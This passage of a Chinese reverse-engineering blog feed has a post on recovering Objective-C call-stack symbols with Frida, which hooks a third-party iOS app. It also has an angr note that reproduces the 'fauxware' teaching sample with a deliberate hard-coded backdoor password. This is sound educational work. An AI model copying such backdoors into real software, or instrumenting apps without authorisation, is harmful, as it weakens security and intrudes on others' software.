title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>android调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid-debug-note/andoid-debug-note/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-08-01T07:52:05.503Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
      <category term="debug" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"/>
    
  </entry>
  
  <entry>
    <title>Android AutoJS 脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-07-30T07:55:01.711Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="AutoJS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/AutoJS/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 